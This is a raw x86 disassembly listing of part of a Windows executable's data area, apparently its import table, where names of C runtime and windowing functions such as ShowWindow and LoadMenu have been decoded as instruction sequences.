  41358f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413593:	add    BYTE PTR [edx+0x3a],bh
  413596:	add    DWORD PTR [eax],eax
  413598:	test   BYTE PTR [edx],bh
  41359a:	add    DWORD PTR [eax],eax
  41359c:	mov    ?,WORD PTR [edx]
  41359e:	add    DWORD PTR [eax],eax
  4135a0:	cwde   
  4135a1:	cmp    al,BYTE PTR [ecx]
  4135a3:	add    BYTE PTR [edx-0x55fffec6],ah
  4135a9:	cmp    al,BYTE PTR [ecx]
  4135ab:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  4135b2:	add    DWORD PTR [eax],eax
  4135b4:	enter  0x13a,0x0
  4135b8:	fdivr  QWORD PTR [edx]
  4135ba:	add    DWORD PTR [eax],eax
  4135bc:	out    0x3a,al
  4135be:	add    DWORD PTR [eax],eax
  4135c0:	repnz cmp al,BYTE PTR [ecx]
  4135c3:	add    dh,bh
  4135c5:	cmp    al,BYTE PTR [ecx]
  4135c7:	add    BYTE PTR [eax],cl
  4135c9:	cmp    eax,DWORD PTR [ecx]
  4135cb:	add    BYTE PTR [eax],bl
  4135cd:	cmp    eax,DWORD PTR [ecx]
  4135cf:	add    BYTE PTR [eax],al
  4135d1:	add    BYTE PTR [eax],al
  4135d3:	add    BYTE PTR [esi],ch
  4135d5:	cmp    eax,DWORD PTR [ecx]
  4135d7:	add    BYTE PTR [edx+0x3b],al
  4135da:	add    DWORD PTR [eax],eax
  4135dc:	pop    eax
  4135dd:	cmp    eax,DWORD PTR [ecx]
  4135df:	add    BYTE PTR [eax+0x3b],ch
  4135e2:	add    DWORD PTR [eax],eax
  4135e4:	je     0x413621
  4135e6:	add    DWORD PTR [eax],eax
  4135e8:	nop
  4135e9:	cmp    eax,DWORD PTR [ecx]
  4135eb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4135f2:	add    DWORD PTR [eax],eax
  4135f4:	int3   
  4135f5:	cmp    eax,DWORD PTR [ecx]
  4135f7:	add    dl,bl
  4135f9:	cmp    eax,DWORD PTR [ecx]
  4135fb:	add    dh,ah
  4135fd:	cmp    eax,DWORD PTR [ecx]
  4135ff:	add    al,bh
  413601:	cmp    eax,DWORD PTR [ecx]
  413603:	add    BYTE PTR [esp+edi*1],cl
  413606:	add    DWORD PTR [eax],eax
  413608:	sbb    bh,BYTE PTR [ecx+eax*1]
  41360b:	add    BYTE PTR [edx],ch
  41360d:	cmp    al,0x1
  41360f:	add    BYTE PTR [edx],bh
  413611:	cmp    al,0x1
  413613:	add    BYTE PTR [esi+0x3c],cl
  413616:	add    DWORD PTR [eax],eax
  413618:	pop    edx
  413619:	cmp    al,0x1
  41361b:	add    BYTE PTR [edx+0x3c],ch
  41361e:	add    DWORD PTR [eax],eax
  413620:	js     0x41365e
  413622:	add    DWORD PTR [eax],eax
  413624:	xchg   edx,eax
  413625:	cmp    al,0x1
  413627:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41362e:	add    DWORD PTR [eax],eax
  413630:	ret    0x13c
  413633:	add    ah,dl
  413635:	cmp    al,0x1
  413637:	add    dh,ah
  413639:	cmp    al,0x1
  41363b:	add    ah,dh
  41363d:	cmp    al,0x1
  41363f:	add    dh,bh
  413641:	cmp    al,0x1
  413643:	add    BYTE PTR [esi],cl
  413645:	cmp    eax,0x3d1e0001
  41364a:	add    DWORD PTR [eax],eax
  41364c:	sub    al,0x3d
  41364e:	add    DWORD PTR [eax],eax
  413650:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413656:	add    DWORD PTR [eax],eax
  413658:	pop    eax
  413659:	cmp    eax,0x3d6e0001
  41365e:	add    DWORD PTR [eax],eax
  413660:	cmp    BYTE PTR ds:0x3d920001,0x1
  413667:	add    BYTE PTR [esi-0x45fffec3],ah
  41366d:	cmp    eax,0x3dce0001
  413672:	add    DWORD PTR [eax],eax
  413674:	jmp    0x13d:0xf800013d
  41367b:	add    BYTE PTR [esi],al
  41367d:	add    DWORD PTR ds:[eax],eax
  413680:	sbb    al,0x3e
  413682:	add    DWORD PTR [eax],eax
  413684:	sub    bh,BYTE PTR [esi]
  413686:	add    DWORD PTR [eax],eax
  413688:	cmp    al,0x3e
  41368a:	add    DWORD PTR [eax],eax
  41368c:	dec    eax
  41368d:	add    DWORD PTR ds:[eax],eax
  413690:	pop    esp
  413691:	add    DWORD PTR ds:[eax],eax
  413694:	ins    BYTE PTR es:[edi],dx
  413695:	add    DWORD PTR ds:[eax],eax
  413698:	jl     0x4136d8
  41369a:	add    DWORD PTR [eax],eax
  41369c:	mov    BYTE PTR [esi],bh
  41369e:	add    DWORD PTR [eax],eax
  4136a0:	cwde   
  4136a1:	add    DWORD PTR ds:[eax],eax
  4136a4:	lods   al,BYTE PTR ds:[esi]
  4136a5:	add    DWORD PTR ds:[eax],eax
  4136a8:	mov    edx,0xcc00013e
  4136ad:	add    DWORD PTR ds:[eax],eax
  4136b0:	fidivr DWORD PTR [esi]
  4136b2:	add    DWORD PTR [eax],eax
  4136b4:	lock add DWORD PTR ds:[eax],eax
  4136b8:	(bad)  
  4136b9:	add    DWORD PTR ds:[eax],eax
  4136bc:	push   cs
  4136bd:	aas    
  4136be:	add    DWORD PTR [eax],eax
  4136c0:	sbb    bh,BYTE PTR [edi]
  4136c2:	add    DWORD PTR [eax],eax
  4136c4:	sub    bh,BYTE PTR [edi]
  4136c6:	add    DWORD PTR [eax],eax
  4136c8:	cmp    BYTE PTR [edi],bh
  4136ca:	add    DWORD PTR [eax],eax
  4136cc:	dec    esi
  4136cd:	aas    
  4136ce:	add    DWORD PTR [eax],eax
  4136d0:	bound  edi,QWORD PTR [edi]
  4136d2:	add    DWORD PTR [eax],eax
  4136d4:	outs   dx,BYTE PTR ds:[esi]
  4136d5:	aas    
  4136d6:	add    DWORD PTR [eax],eax
  4136d8:	js     0x413719
  4136da:	add    DWORD PTR [eax],eax
  4136dc:	xchg   BYTE PTR [edi],bh
  4136de:	add    DWORD PTR [eax],eax
  4136e0:	xchg   esp,eax
  4136e1:	aas    
  4136e2:	add    DWORD PTR [eax],eax
  4136e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e5:	aas    
  4136e6:	add    DWORD PTR [eax],eax
  4136e8:	mov    dh,0x3f
  4136ea:	add    DWORD PTR [eax],eax
  4136ec:	enter  0x13f,0x0
  4136f0:	fidivr DWORD PTR [edi]
  4136f2:	add    DWORD PTR [eax],eax
  4136f4:	in     al,dx
  4136f5:	aas    
  4136f6:	add    DWORD PTR [eax],eax
  4136f8:	clc    
  4136f9:	aas    
  4136fa:	add    DWORD PTR [eax],eax
  4136fc:	or     al,BYTE PTR [eax+0x1]
  4136ff:	add    BYTE PTR [edx],ah
  413701:	inc    eax
  413702:	add    DWORD PTR [eax],eax
  413704:	xor    al,0x40
  413706:	add    DWORD PTR [eax],eax
  413708:	dec    eax
  413709:	inc    eax
  41370a:	add    DWORD PTR [eax],eax
  41370c:	pop    edx
  41370d:	inc    eax
  41370e:	add    DWORD PTR [eax],eax
  413710:	fs inc eax
  413712:	add    DWORD PTR [eax],eax
  413714:	je     0x413756
  413716:	add    DWORD PTR [eax],eax
  413718:	add    BYTE PTR [eax+0x1],0x0
  41371c:	cwde   
  41371d:	inc    eax
  41371e:	add    DWORD PTR [eax],eax
  413720:	lods   al,BYTE PTR ds:[esi]
  413721:	inc    eax
  413722:	add    DWORD PTR [eax],eax
  413724:	mov    esp,0xca000140
  413729:	inc    eax
  41372a:	add    DWORD PTR [eax],eax
  41372c:	loopne 0x41376e
  41372e:	add    DWORD PTR [eax],eax
  413730:	lock inc eax
  413732:	add    DWORD PTR [eax],eax
  413734:	or     BYTE PTR [ecx+0x1],al
  413737:	add    BYTE PTR [esi],dl
  413739:	inc    ecx
  41373a:	add    DWORD PTR [eax],eax
  41373c:	sub    BYTE PTR [ecx+0x1],al
  41373f:	add    BYTE PTR [esi],dh
  413741:	inc    ecx
  413742:	add    DWORD PTR [eax],eax
  413744:	inc    esp
  413745:	inc    ecx
  413746:	add    DWORD PTR [eax],eax
  413748:	push   edx
  413749:	inc    ecx
  41374a:	add    DWORD PTR [eax],eax
  41374c:	pusha  
  41374d:	inc    ecx
  41374e:	add    DWORD PTR [eax],eax
  413750:	jo     0x413793
  413752:	add    DWORD PTR [eax],eax
  413754:	test   BYTE PTR [ecx+0x1],al
  413757:	add    BYTE PTR [edx-0x5ffffebf],dl
  41375d:	inc    ecx
  41375e:	add    DWORD PTR [eax],eax
  413760:	scas   al,BYTE PTR es:[edi]
  413761:	inc    ecx
  413762:	add    DWORD PTR [eax],eax
  413764:	mov    esi,0xd6000141
  413769:	inc    ecx
  41376a:	add    DWORD PTR [eax],eax
  41376c:	call   0xfa4138b2
  413771:	inc    ecx
  413772:	add    DWORD PTR [eax],eax
  413774:	push   es
  413775:	inc    edx
  413776:	add    DWORD PTR [eax],eax
  413778:	sbb    BYTE PTR [edx+0x1],al
  41377b:	add    BYTE PTR [esi],ch
  41377d:	inc    edx
  41377e:	add    DWORD PTR [eax],eax
  413780:	cmp    al,BYTE PTR [edx+0x1]
  413783:	add    BYTE PTR [esi+0x42],cl
  413786:	add    DWORD PTR [eax],eax
  413788:	pusha  
  413789:	inc    edx
  41378a:	add    DWORD PTR [eax],eax
  41378c:	add    BYTE PTR [eax],al
  41378e:	add    BYTE PTR [eax],al
  413790:	add    BYTE PTR [edx+0x1],0x0
  413794:	cwde   
  413795:	inc    edx
  413796:	add    DWORD PTR [eax],eax
  413798:	scas   al,BYTE PTR es:[edi]
  413799:	inc    edx
  41379a:	add    DWORD PTR [eax],eax
  41379c:	mov    edx,0xca000142
  4137a1:	inc    edx
  4137a2:	add    DWORD PTR [eax],eax
  4137a4:	fadd   QWORD PTR [edx+0x1]
  4137a7:	add    ah,ch
  4137a9:	inc    edx
  4137aa:	add    DWORD PTR [eax],eax
  4137ac:	clc    
  4137ad:	inc    edx
  4137ae:	add    DWORD PTR [eax],eax
  4137b0:	push   cs
  4137b1:	inc    ebx
  4137b2:	add    DWORD PTR [eax],eax
  4137b4:	sbb    BYTE PTR [ebx+0x1],al
  4137b7:	add    BYTE PTR [ebx+eax*2],ah
  4137ba:	add    DWORD PTR [eax],eax
  4137bc:	xor    al,BYTE PTR [ebx+0x1]
  4137bf:	add    BYTE PTR [edx+0x43],al
  4137c2:	add    DWORD PTR [eax],eax
  4137c4:	push   eax
  4137c5:	inc    ebx
  4137c6:	add    DWORD PTR [eax],eax
  4137c8:	pop    edx
  4137c9:	inc    ebx
  4137ca:	add    DWORD PTR [eax],eax
  4137cc:	outs   dx,BYTE PTR ds:[esi]
  4137cd:	inc    ebx
  4137ce:	add    DWORD PTR [eax],eax
  4137d0:	test   BYTE PTR [ebx+0x1],al
  4137d3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4137da:	add    DWORD PTR [eax],eax
  4137dc:	mov    eax,0xcc000143
  4137e1:	inc    ebx
  4137e2:	add    DWORD PTR [eax],eax
  4137e4:	fiadd  DWORD PTR [ebx+0x1]
  4137e7:	add    dl,ch
  4137e9:	inc    ebx
  4137ea:	add    DWORD PTR [eax],eax
  4137ec:	clc    
  4137ed:	inc    ebx
  4137ee:	add    DWORD PTR [eax],eax
  4137f0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4137f4:	adc    al,0x44
  4137f6:	add    DWORD PTR [eax],eax
  4137f8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4137fc:	xor    al,0x44
  4137fe:	add    DWORD PTR [eax],eax
  413800:	inc    esi
  413801:	inc    esp
  413802:	add    DWORD PTR [eax],eax
  413804:	pop    edx
  413805:	inc    esp
  413806:	add    DWORD PTR [eax],eax
  413808:	inc    sp
  41380a:	add    DWORD PTR [eax],eax
  41380c:	jbe    0x413852
  41380e:	add    DWORD PTR [eax],eax
  413810:	mov    es,WORD PTR [ecx+eax*1+0x0]
  413814:	sahf   
  413815:	inc    esp
  413816:	add    DWORD PTR [eax],eax
  413818:	scas   al,BYTE PTR es:[edi]
  413819:	inc    esp
  41381a:	add    DWORD PTR [eax],eax
  41381c:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413821:	inc    esp
  413822:	add    DWORD PTR [eax],eax
  413824:	in     al,dx
  413825:	inc    esp
  413826:	add    DWORD PTR [eax],eax
  413828:	clc    
  413829:	inc    esp
  41382a:	add    DWORD PTR [eax],eax
  41382c:	or     al,BYTE PTR [ebp+0x1]
  41382f:	add    BYTE PTR [esi],bl
  413831:	inc    ebp
  413832:	add    DWORD PTR [eax],eax
  413834:	sub    BYTE PTR [ebp+0x1],al
  413837:	add    BYTE PTR [eax],bh
  413839:	inc    ebp
  41383a:	add    DWORD PTR [eax],eax
  41383c:	inc    esp
  41383d:	inc    ebp
  41383e:	add    DWORD PTR [eax],eax
  413840:	dec    esi
  413841:	inc    ebp
  413842:	add    DWORD PTR [eax],eax
  413844:	pop    edx
  413845:	inc    ebp
  413846:	add    DWORD PTR [eax],eax
  413848:	add    BYTE PTR [eax],al
  41384a:	add    BYTE PTR [eax],al
  41384c:	jbe    0x413893
  41384e:	add    DWORD PTR [eax],eax
  413850:	mov    BYTE PTR [ebp+0x1],al
  413853:	add    BYTE PTR [eax-0x51fffebb],ah
  413859:	inc    ebp
  41385a:	add    DWORD PTR [eax],eax
  41385c:	retf   0x145
  41385f:	add    ah,bl
  413861:	inc    ebp
  413862:	add    DWORD PTR [eax],eax
  413864:	in     al,dx
  413865:	inc    ebp
  413866:	add    DWORD PTR [eax],eax
  413868:	add    BYTE PTR [esi+0x1],al
  41386b:	add    BYTE PTR [eax],bl
  41386d:	inc    esi
  41386e:	add    DWORD PTR [eax],eax
  413870:	sub    al,BYTE PTR [esi+0x1]
  413873:	add    BYTE PTR [esi],dh
  413875:	inc    esi
  413876:	add    DWORD PTR [eax],eax
  413878:	dec    edx
  413879:	inc    esi
  41387a:	add    DWORD PTR [eax],eax
  41387c:	pusha  
  41387d:	inc    esi
  41387e:	add    DWORD PTR [eax],eax
  413880:	ins    BYTE PTR es:[edi],dx
  413881:	inc    esi
  413882:	add    DWORD PTR [eax],eax
  413884:	add    BYTE PTR [esi+0x1],0x0
  413888:	xchg   esp,eax
  413889:	inc    esi
  41388a:	add    DWORD PTR [eax],eax
  41388c:	mov    al,ds:0xae000146
  413891:	inc    esi
  413892:	add    DWORD PTR [eax],eax
  413894:	ret    0x146
  413897:	add    dl,bl
  413899:	inc    esi
  41389a:	add    DWORD PTR [eax],eax
  41389c:	call   0xf24139e7
  4138a1:	inc    esi
  4138a2:	add    DWORD PTR [eax],eax
  4138a4:	inc    BYTE PTR [esi+0x1]
  4138a7:	add    BYTE PTR [esi],cl
  4138a9:	inc    edi
  4138aa:	add    DWORD PTR [eax],eax
  4138ac:	and    al,0x47
  4138ae:	add    DWORD PTR [eax],eax
  4138b0:	cmp    al,BYTE PTR [edi+0x1]
  4138b3:	add    BYTE PTR [edi+eax*2+0x1],cl
  4138b7:	add    BYTE PTR [edx+0x47],bl
  4138ba:	add    DWORD PTR [eax],eax
  4138bc:	push   0x47
  4138be:	add    DWORD PTR [eax],eax
  4138c0:	jle    0x413909
  4138c2:	add    DWORD PTR [eax],eax
  4138c4:	xchg   esi,eax
  4138c5:	inc    edi
  4138c6:	add    DWORD PTR [eax],eax
  4138c8:	mov    ds:0xba000147,al
  4138cd:	inc    edi
  4138ce:	add    DWORD PTR [eax],eax
  4138d0:	int3   
  4138d1:	inc    edi
  4138d2:	add    DWORD PTR [eax],eax
  4138d4:	fadd   QWORD PTR [edi+0x1]
  4138d7:	add    al,dh
  4138d9:	inc    edi
  4138da:	add    DWORD PTR [eax],eax
  4138dc:	push   es
  4138dd:	dec    eax
  4138de:	add    DWORD PTR [eax],eax
  4138e0:	sbb    cl,BYTE PTR [eax+0x1]
  4138e3:	add    BYTE PTR [eax],ch
  4138e5:	dec    eax
  4138e6:	add    DWORD PTR [eax],eax
  4138e8:	cmp    cl,BYTE PTR [eax+0x1]
  4138eb:	add    BYTE PTR [eax+0x48],cl
  4138ee:	add    DWORD PTR [eax],eax
  4138f0:	push   esp
  4138f1:	dec    eax
  4138f2:	add    DWORD PTR [eax],eax
  4138f4:	outs   dx,BYTE PTR ds:[esi]
  4138f5:	dec    eax
  4138f6:	add    DWORD PTR [eax],eax
  4138f8:	mov    BYTE PTR [eax+0x1],cl
  4138fb:	add    BYTE PTR [eax-0x59fffeb8],bl
  413901:	dec    eax
  413902:	add    DWORD PTR [eax],eax
  413904:	mov    dl,0x48
  413906:	add    DWORD PTR [eax],eax
  413908:	ror    BYTE PTR [eax+0x1],0x0
  41390c:	(bad)  
  41390d:	dec    eax
  41390e:	add    DWORD PTR [eax],eax
  413910:	add    BYTE PTR [eax],al
  413912:	add    BYTE PTR [eax],al
  413914:	lock dec eax
  413916:	add    DWORD PTR [eax],eax
  413918:	dec    BYTE PTR [eax+0x1]
  41391b:	add    BYTE PTR [esi],cl
  41391d:	dec    ecx
  41391e:	add    DWORD PTR [eax],eax
  413920:	push   ds
  413921:	dec    ecx
  413922:	add    DWORD PTR [eax],eax
  413924:	cs dec ecx
  413926:	add    DWORD PTR [eax],eax
  413928:	add    BYTE PTR [eax],al
  41392a:	add    BYTE PTR [eax],al
  41392c:	push   eax
  41392d:	dec    ecx
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [eax],al
  413932:	add    BYTE PTR [eax],al
  413934:	cmc    
  413935:	add    BYTE PTR [edi+0x63],bl
  413938:	outs   dx,DWORD PTR ds:[esi]
  413939:	outs   dx,BYTE PTR ds:[esi]
  41393a:	je     0x4139ae
  41393c:	outs   dx,DWORD PTR ds:[esi]
  41393d:	ins    BYTE PTR es:[edi],dx
  41393e:	data16 jo 0x413941
  413941:	add    BYTE PTR [ebp+0x3],bl
  413944:	arpl   WORD PTR [ecx+0x6c],sp
  413947:	ins    BYTE PTR es:[edi],dx
  413948:	outs   dx,DWORD PTR ds:[esi]
  413949:	arpl   WORD PTR [eax],ax
  41394b:	add    BYTE PTR [edx+0x3],dh
  41394e:	data16 ins BYTE PTR es:[edi],dx
  413950:	outs   dx,DWORD PTR ds:[esi]
  413951:	outs   dx,DWORD PTR ds:[esi]
  413952:	jb     0x413954
  413954:	push   ds
  413955:	add    al,0x77
  413957:	arpl   WORD PTR [ebx+0x63],si
  41395a:	push   0xb000072
  41395f:	add    al,0x74
  413961:	outs   dx,DWORD PTR ds:[esi]
  413962:	ja     0x4139d0
  413964:	outs   dx,DWORD PTR ds:[esi]
  413965:	ja     0x4139cc
  413967:	jb     0x413969
  413969:	add    BYTE PTR [ebx+0x735f5f00],dh
  41396f:	gs je  0x4139d1
  413972:	popa   
  413973:	jo     0x4139e5
  413975:	pop    edi
  413976:	je     0x4139f1
  413978:	jo     0x4139df
  41397a:	add    BYTE PTR [eax],al
  41397c:	in     eax,0x3
  41397e:	jae    0x4139f4
  413980:	jb     0x4139e5
  413982:	push   0xa0000072
  413987:	add    BYTE PTR [edi+0x5f],bl
  41398a:	jo     0x4139eb
  41398c:	pop    edi
  41398d:	ins    WORD PTR es:[edi],dx
  41398f:	outs   dx,DWORD PTR ds:[esi]
  413990:	fs add BYTE PTR gs:[eax],al
  413994:	int3   
  413995:	add    esi,DWORD PTR [ecx+0x73]
  413998:	outs   dx,DWORD PTR ds:[esi]
  413999:	jb     0x413a0f
  41399b:	add    BYTE PTR [ebx+0x77736903],ch
  4139a1:	js     0x413a07
  4139a3:	imul   esp,DWORD PTR [edi+0x69],0x3a00074
  4139aa:	imul   esi,DWORD PTR [ebx+0x77],0x68706c61
  4139b1:	popa   
  4139b2:	add    BYTE PTR [eax],al
  4139b4:	fwait
  4139b5:	add    BYTE PTR [edi+0x5f],bl
  4139b8:	jo     0x413a19
  4139ba:	pop    edi
  4139bb:	arpl   WORD PTR [edi+0x6d],bp
  4139be:	ins    DWORD PTR es:[edi],dx
  4139bf:	outs   dx,DWORD PTR ds:[esi]
  4139c0:	fs add BYTE PTR gs:[eax],al
  4139c4:	sub    BYTE PTR [edi+esi*2],al
  4139c7:	arpl   WORD PTR [ebx+0x6e],si
  4139ca:	arpl   WORD PTR [ebp+0x70],bp
  4139cd:	add    BYTE PTR [ebp+0x3],bh
  4139d0:	data16 jb 0x413a38
  4139d3:	add    BYTE PTR gs:[eax],al
  4139d6:	or     al,0x4
  4139d8:	je     0x413a49
  4139da:	ja     0x413a51
  4139dc:	jo     0x413a4e
  4139de:	gs jb  0x4139e1
  4139e1:	add    BYTE PTR [ecx+0x3],bh
  4139e4:	data16 jo 0x413a5c
  4139e7:	je     0x413a5c
  4139e9:	add    BYTE PTR [ebp+0x74656703],cl
  4139ef:	outs   dx,BYTE PTR gs:[esi]
  4139f1:	jbe    0x4139f3
  4139f3:	add    BYTE PTR [eax+0x3],ah
  4139f6:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4139fa:	imul   eax,DWORD PTR [eax],0xffffffff
  4139fd:	add    esi,DWORD PTR [ebx+0x77]
  413a00:	jo     0x413a74
  413a02:	imul   ebp,DWORD PTR [esi+0x74],0xc8000066
  413a09:	add    esi,DWORD PTR [eax+0x75]
  413a0c:	je     0x413a71
  413a0e:	push   0xc9007261
  413a13:	add    esi,DWORD PTR [eax+0x75]
  413a16:	je     0x413a8b
  413a18:	add    BYTE PTR [eax],al
  413a1a:	mov    ecx,0x74626d03
  413a1f:	outs   dx,DWORD PTR ds:[esi]
  413a20:	ja     0x413a85
  413a22:	add    BYTE PTR [eax],al
  413a24:	test   eax,0x77736903
  413a29:	jae    0x413a9b
  413a2b:	popa   
  413a2c:	arpl   WORD PTR [ebp+0x0],sp
  413a2f:	add    BYTE PTR [ecx],cl
  413a31:	add    al,0x74
  413a33:	outs   dx,DWORD PTR ds:[esi]
  413a34:	ins    BYTE PTR es:[edi],dx
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	ja     0x413a9d
  413a38:	jb     0x413a3a
  413a3a:	fild   DWORD PTR [eax]
  413a3c:	pop    edi
  413a3d:	popa   
  413a3e:	ins    DWORD PTR es:[edi],dx
  413a3f:	jae    0x413aa8
  413a41:	pop    edi
  413a42:	gs js  0x413aae
  413a45:	je     0x413a47
  413a47:	add    ch,al
  413a49:	add    esi,DWORD PTR [eax+0x72]
  413a4c:	imul   ebp,DWORD PTR [esi+0x74],0x86000066
  413a53:	add    DWORD PTR [edi+0x69],ebx
  413a56:	outs   dx,BYTE PTR ds:[esi]
  413a57:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x9e006d72
  413a5f:	add    DWORD PTR [edi+0x69],ebx
  413a62:	jae    0x413ad1
  413a64:	bound  esp,QWORD PTR [edx+0x6c]
  413a67:	gs popa 
  413a69:	add    BYTE PTR fs:[eax],al
  413a6c:	push   edx
  413a6d:	add    BYTE PTR [edi+0x58],bl
  413a70:	arpl   WORD PTR [eax+0x74],si
  413a73:	inc    esi
  413a74:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3f10072
  413a7c:	jae    0x413af2
  413a7e:	jb     0x413aee
  413a80:	arpl   WORD PTR [ebp+0x70],bp
  413a83:	add    dl,dl
  413a85:	add    esi,DWORD PTR [edx+0x65]
  413a88:	ins    DWORD PTR es:[edi],dx
  413a89:	outs   dx,DWORD PTR ds:[esi]
  413a8a:	jbe    0x413af1
  413a8c:	add    BYTE PTR [eax],al
  413a8e:	cld    
  413a8f:	add    esi,DWORD PTR [ebx+0x74]
  413a92:	jb     0x413b08
  413a94:	outs   dx,DWORD PTR ds:[esi]
  413a95:	ins    BYTE PTR es:[edi],dx
  413a96:	add    BYTE PTR [eax],al
  413a98:	and    eax,0x73637704
  413a9d:	ins    BYTE PTR es:[edi],dx
  413a9e:	outs   dx,BYTE PTR gs:[esi]
  413aa0:	add    BYTE PTR [eax],al
  413aa2:	and    eax,DWORD PTR [ecx]
  413aa4:	pop    edi
  413aa5:	gs js  0x413b11
  413aa8:	je     0x413aaa
  413aaa:	call   0x65a499af
  413aaf:	js     0x413b1a
  413ab1:	je     0x413ab3
  413ab3:	add    BYTE PTR [ebp+0x73736903],bl
  413ab9:	jo     0x413b1c
  413abb:	arpl   WORD PTR [ebp+0x0],sp
  413abe:	call   0x72b5adc6
  413ac3:	arpl   WORD PTR [eax+0x79],si
  413ac6:	add    BYTE PTR [eax],al
  413ac8:	mov    ch,0x0
  413aca:	pop    edi
  413acb:	pop    edi
  413acc:	jae    0x413b33
  413ace:	je     0x413b45
  413ad0:	jae    0x413b37
  413ad2:	jb     0x413b41
  413ad4:	popa   
  413ad5:	je     0x413b3f
  413ad7:	gs jb  0x413b4c
  413ada:	add    BYTE PTR [eax],al
  413adc:	repnz add esi,DWORD PTR [ebx+0x74]
  413ae0:	jb     0x413b50
  413ae2:	arpl   WORD PTR [eax+0x79],si
  413ae5:	add    BYTE PTR [ebx+eax*1+0x64777369],ah
  413aec:	imul   esp,DWORD PTR [edi+0x69],0xa3000074
  413af3:	add    ebp,DWORD PTR [ecx+0x73]
  413af6:	ja     0x413b5b
  413af8:	je     0x413b73
  413afa:	jo     0x413b61
  413afc:	add    BYTE PTR [eax],al
  413afe:	mov    ch,0x3
  413b00:	ins    DWORD PTR es:[edi],dx
  413b01:	popa   
  413b02:	ins    BYTE PTR es:[edi],dx
  413b03:	ins    BYTE PTR es:[edi],dx
  413b04:	outs   dx,DWORD PTR ds:[esi]
  413b05:	arpl   WORD PTR [eax],ax
  413b07:	add    BYTE PTR [edx+0x0],dh
  413b0a:	pop    edi
  413b0b:	pop    edi
  413b0c:	addr16 gs je 0x413b7d
  413b10:	popa   
  413b11:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413b18:	add    DWORD PTR [ebx+esi*2],eax
  413b1b:	ja     0x413b90
  413b1d:	arpl   WORD PTR [ecx+0x6e],sp
  413b20:	data16 add BYTE PTR [ebp+0x53],cl
  413b24:	push   esi
  413b25:	inc    ebx
  413b26:	push   edx
  413b27:	push   esp
  413b28:	cs fs ins BYTE PTR es:[edi],dx
  413b2b:	ins    BYTE PTR es:[edi],dx
  413b2c:	add    BYTE PTR [eax],al
  413b2e:	xor    eax,0x74654701
  413b33:	dec    ebp
  413b34:	outs   dx,BYTE PTR gs:[esi]
  413b36:	jne    0x413b81
  413b38:	je     0x413b9f
  413b3a:	ins    DWORD PTR es:[edi],dx
  413b3b:	dec    ecx
  413b3c:	outs   dx,BYTE PTR ds:[esi]
  413b3d:	outs   dx,WORD PTR ds:[esi]
  413b3f:	push   edi
  413b40:	add    BYTE PTR [eax],al
  413b42:	sub    BYTE PTR [ecx],al
  413b44:	inc    edi
  413b45:	gs je  0x413b94
  413b48:	popa   
  413b49:	jae    0x413bbf
  413b4b:	inc    ecx
  413b4c:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413b50:	gs push eax
  413b52:	outs   dx,DWORD PTR ds:[esi]
  413b53:	jo     0x413bca
  413b55:	jo     0x413b57
  413b57:	add    dl,ah
  413b59:	add    BYTE PTR [esi+0x69],al
  413b5c:	outs   dx,BYTE PTR ds:[esi]
  413b5d:	fs push edi
  413b5f:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [ebp+0x1],bh
  413b6a:	dec    eax
  413b6b:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x74657261
  413b73:	add    BYTE PTR [esi+0x1],ah
  413b76:	inc    edi
  413b77:	gs je  0x413bcf
  413b7a:	jae    0x413be1
  413b7c:	jb     0x413bcd
  413b7e:	bound  ebp,QWORD PTR [edx+0x65]
  413b81:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  413b85:	outs   dx,WORD PTR ds:[esi]
  413b87:	jb     0x413bf6
  413b89:	popa   
  413b8a:	je     0x413bf5
  413b8c:	outs   dx,DWORD PTR ds:[esi]
  413b8d:	outs   dx,BYTE PTR ds:[esi]
  413b8e:	push   edi
  413b8f:	add    ch,bl
  413b91:	add    BYTE PTR [ebp+0x71],al
  413b94:	jne    0x413bf7
  413b96:	ins    BYTE PTR es:[edi],dx
  413b97:	push   edx
  413b98:	arpl   WORD PTR gs:[eax+eax*1-0x6c],si
  413b9d:	add    dl,BYTE PTR [edx+esi*2+0x61]
  413ba1:	outs   dx,BYTE PTR ds:[esi]
  413ba2:	jae    0x413c10
  413ba4:	popa   
  413ba5:	je     0x413c0c
  413ba7:	inc    ecx
  413ba8:	arpl   WORD PTR [ebx+0x65],sp
  413bab:	ins    BYTE PTR es:[edi],dx
  413bac:	gs jb  0x413c10
  413baf:	je     0x413c20
  413bb1:	jb     0x413c0a
  413bb3:	add    BYTE PTR [esi],bh
  413bb5:	add    BYTE PTR [ebx+0x68],al
  413bb8:	imul   ebp,DWORD PTR [esp+eiz*2+0x57],0x6f646e69
  413bc0:	ja     0x413c08
  413bc2:	jb     0x413c33
  413bc4:	ins    DWORD PTR es:[edi],dx
  413bc5:	push   eax
  413bc6:	outs   dx,DWORD PTR ds:[esi]
  413bc7:	imul   ebp,DWORD PTR [esi+0x74],0x28a0000
  413bce:	push   esp
  413bcf:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  413bd7:	ja     0x413c4c
  413bd9:	add    BYTE PTR [esi+0x616f4c01],dh
  413bdf:	fs dec ebp
  413be1:	outs   dx,BYTE PTR gs:[esi]
  413be3:	jne    0x413c26
  413be5:	add    al,al
  413be7:	add    BYTE PTR [ebp+0x6e],al
  413bea:	popa   
  413beb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  413bef:	arpl   WORD PTR [edx+0x6f],si
  413bf2:	ins    BYTE PTR es:[edi],dx
  413bf3:	ins    BYTE PTR es:[edi],dx
  413bf4:	inc    edx
